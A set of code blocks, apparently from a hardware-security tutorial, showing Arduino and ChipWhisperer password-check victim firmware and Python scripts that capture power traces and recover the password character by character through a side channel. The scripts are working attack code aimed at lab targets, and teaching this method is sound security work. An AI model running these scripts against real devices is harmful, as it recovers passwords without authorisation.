["```\n// Trigger is Pin 2\nint triggerPin = 2;\n\nString known_passwordstr = String(\"ilovecheese\");\nString input_passwordstr;\nchar input_password[20];\nchar tempchr;\nint index;\n\n// the setup routine runs once when you press reset:\nvoid setup() {\n  // initialize serial communication at 9600 bits per second:\n  Serial.begin(9600);\n  pinMode(triggerPin, OUTPUT);\n  tempchr = '0';\n  index = 0;\n}\n\n// the loop routine runs over and over again forever:\nvoid loop() {\n  //Wait a little bit after startup & clear everything\n  digitalWrite(triggerPin, LOW);\n  delay(250);\n  Serial.flush();\n  Serial.write(\"Enter Password:\");\n\n  // wait for last character\n  while ((tempchr != '\\n') && (index < 19)){\n    if(Serial.available() > 0){\n      tempchr = Serial.read();\n      input_password[index++] = tempchr;\n    }\n  }\n\n  // Null terminate and strip non-characters\n  input_password[index] = '\\0';\n  input_passwordstr = String(input_password);\n  input_passwordstr.trim();\n  index = 0;\n  tempchr = 0;\n\n1 digitalWrite(triggerPin, HIGH); \n\n2 if(input_passwordstr == known_passwordstr){ \n    Serial.write(\"Password OK\\n\");\n  } else {\n    //Delay up to 500ms randomly\n  3 delay(random(500)); \n    Serial.write(\"Password Bad\\n\");\n  }\n}\n```", "```\n#Simple Arduino password SPA/timing characterization\nimport numpy as np\nimport pylab as plt\nimport serial\nimport time\n#picoscope module from https://github.com/colinoflynn/pico-python\nfrom picoscope import ps2000\n\n#Adjust serial port as needed\ntry:\n    ser = serial.Serial(\n    port='com42',\n    baudrate=9600,\n    timeout=0.500\n    )\n\n    ps = ps2000.PS2000()\n\n    print(\"Found the following picoscope:\")\n    print(ps.getAllUnitInfo())\n\n    #Need at least 13us from trigger\n    obs_duration = 13E-6\n\n    #Sample at least 4096 points within that window\n    sampling_interval = obs_duration / 4096\n\n    #Configure timebase\n (actualSamplingInterval, nSamples, maxSamples) = \\\n        ps.setSamplingInterval(sampling_interval, obs_duration)\n\n    print(\"Sampling interval = %f us\" % (actualSamplingInterval *\n                                         nSamples * 1E6))\n    #Channel A is trigger\n    ps.setChannel('A', 'DC', 10.0, 0.0, enabled=True)\n    ps.setSimpleTrigger('A', 1.0, 'Rising', timeout_ms=2000, enabled=True)\n\n    #50mV range on channel B, AC coupled, 20MHz BW limit\n    ps.setChannel('B', 'AC', 0.05, 0.0, enabled=True, BWLimited=True)\n\n    #Passwords to check\n    test_list = [\"ilovecheese\", \"iloveaaaaaa\"]\n    data_list = []\n\n    #Clear system\n    ser.write((test_list[0] + \"\\n\").encode(\"utf-8\"))\n    ser.read(128)\n\n    for pw_test in test_list:\n        #Run capture\n        ps.runBlock()\n        time.sleep(0.05)\n        ser.write((pw_test + \"\\n\").encode(\"utf-8\"))\n        ps.waitReady()\n        print('Sent \"%s\" - received \"%s\"' %(pw_test, ser.read(128)))\n        data = ps.getDataV('B', nSamples, returnOverflow=False)\n        #Normalize data by std-dev and mean\n        data = (data - np.mean(data)) / np.std(data)\n        data_list.append(data)\n\n    #Plot password tests\n    x = range(0, nSamples)\n    pltstyles = ['-', '--', '-.']\n    pltcolor = ['0.5', '0.1', 'r']\n    plt.figure().gca().set_xticks(range(0, nSamples, 25))\n    for i in range(0, len(data_list)):\n        plt.plot(x, data_list[i], pltstyles[i], c=pltcolor[i], label= \\        test_list[i])\n    plt.legend()\n    plt.xlabel(\"Sample Number\")\n    plt.ylabel(\"Normalized Measurement\")\n    plt.title(\"Password Test Plot\")\n    plt.grid()\n    plt.show()\nfinally:\n    #Always close off things\n    ser.close()\n    ps.stop()\n    ps.close()\n```", "```\n#Simple Arduino password SPA/timing attack\nimport numpy as np\nimport pylab as plt\nimport serial\nimport time\n#picoscope module from https://github.com/colinoflynn/pico-python\nfrom picoscope import ps2000\n\n#Adjust serial port as needed\ntry:\n    ser = serial.Serial(\n    port='com42',\n    baudrate=9600,\n    timeout=0.500\n    )\n\n    ps = ps2000.PS2000()\n\n    print(\"Found the following picoscope:\")\n    print(ps.getAllUnitInfo())\n\n    #Need at least 13us from trigger\n    obs_duration = 13E-6\n\n    #Sample at least 4096 points within that window\n    sampling_interval = obs_duration / 4096\n\n    #Configure timebase\n    (actualSamplingInterval, nSamples, maxSamples) = \\\n        ps.setSamplingInterval(sampling_interval, obs_duration)\n\n #Channel A is trigger\n    ps.setChannel('A', 'DC', 10.0, 0.0, enabled=True)\n    ps.setSimpleTrigger('A', 1.0, 'Rising', timeout_ms=2000, enabled=True)\n\n    #50mV range on channel B, AC coupled, 20MHz BW limit\n    ps.setChannel('B', 'AC', 0.05, 0.0, enabled=True, BWLimited=True)\n\n    guesspattern=\"abcdefghijklmnopqrstuvwxyz\"\n    current_pw = \"\"\n\n    start_index = 148\n    inc_index = 25\n\n    #Currently uses fixed length of 11, could also use response\n    for guesschar in range(0,11):\n        for g in guesspattern:\n            #Make guess, ensure minimum length too\n            pw_test = current_pw + g\n            pw_test = pw_test.ljust(11, 'a')\n\n            #Run capture\n            ps.runBlock()\n            time.sleep(0.05)\n            ser.write((pw_test + \"\\n\").encode(\"utf-8\"))\n            ps.waitReady()\n            response = ser.read(128).decode(\"utf-8\").replace(\"\\n\",\"\")\n            print('Sent \"%s\" - received \"%s\"' %(pw_test, response))\n            if \"Password OK\" in response:\n                print(\"****FOUND PASSWORD = %s\"%pw_test)\n                raise Exception(\"password found\")\n            data = ps.getDataV('B', nSamples, returnOverflow=False)\n            #Normalized by std-dev and mean\n            data = (data - np.mean(data)) / np.std(data)\n\n            #Location of check\n            idx = (guesschar*inc_index) + start_index\n\n            #Empirical threshold, check around location a bit\n            if max(data[idx-1 : idx+2]) > 1.2:\n                print(\"***Character %d = %s\"%(guesschar, g))\n                current_pw = current_pw + g;\n                break\n\n            print\n\n    print(\"Password = %s\"%current_pw)\n\nfinally:\n    #Always close off things\n    ser.close()\n    ps.stop()\n    ps.close()\n```", "```\n%%bash\n**cd ../hardware/victims/firmware/basic-passwdcheck**\n**make PLATFORM=CWNANO CRYPTO_TARGET=NONE**\n```", "```\nSCOPETYPE = 'OPENADC'\nPLATFORM = 'CWNANO'\n%run \"Helper_Scripts/Setup_Generic.ipynb\"\nfw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-CWNANO.hex'\ncw.program_target(scope, prog, fw_path)\n```", "```\nret = \"\"\ntarget.flush()\nreset_target(scope)\ntime.sleep(0.001)\nnum_char = target.in_waiting()\nwhile num_char > 0:\n    ret += target.read(timeout=10)\n    time.sleep(0.01)\n    num_char = target.in_waiting()\nprint(ret)\n```", "```\n*****Safe-o-matic 3000 Booting...\nAligning bits........[DONE]\nChecking Cesium RNG..[DONE]\nMasquerading flash...[DONE]\nDecrypting database..[DONE]\n\nWARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED\nPlease enter password to continue:\n```", "```\ndef cap_pass_trace(pass_guess):\n    ret = \"\"\n    reset_target(scope)\n    time.sleep(0.01)\n    num_char = target.in_waiting()\n    #Wait for boot messages to finish so we are ready to enter password\n    while num_char > 0:\n        ret += target.read(num_char, 10)\n        time.sleep(0.01)\n        num_char = target.in_waiting()\n\n    scope.arm()\n    target.write(pass_guess)\n    ret = scope.capture()\n    if ret:\n        print('Timeout happened during acquisition')\n\n    trace = scope.get_last_trace()\n    return trace\n```", "```\n%matplotlib notebook\nimport matplotlib.pylab as plt\ntrace = cap_pass_trace(\"hunter2\\n\")\nplt.plot(trace[0:800], 'g')\n```", "```\n%matplotlib notebook\nimport matplotlib.pylab as plt\nplt.figure(figsize=(10,4))\nfor guess in \"0abch\":\n    trace = cap_pass_trace(guess + \"\\n\")\n    plt.plot(trace[0:100])\nplt.show()\n```", "```\nbad_trace = cap_pass_trace(\"\\x00\" + \"\\n\")\nfor guess in \"abcdefghijklmnopqrstuvwxyz0123456789\":\n    diff = cap_pass_trace(guess + \"\\n\") - bad_trace\n  1 #print(sum(abs(diff))) \n  2 if sum(abs(diff)) > **80**: \n        print(\"Best guess: \" + guess)\n        break\n```", "```\nfull_guess = \"\"\nwhile(len(full_guess) < 5):\n    bad_trace = cap_pass_trace(full_guess + \"\\x00\" + \"\\n\")\n  1 if sum(abs(cap_pass_trace(full_guess + \"\\x00\" + \"\\n\") - bad_trace)) > **50**: \n        continue\n    for guess in \"abcdefghijklmnopqrstuvwxyz0123456789\":\n        diff = cap_pass_trace(full_guess + guess + \"\\n\") - bad_trace\n        if sum(abs(diff)) > **80**:\n            full_guess += guess\n            print(\"Best guess: \" + full_guess)\n            break\n```"]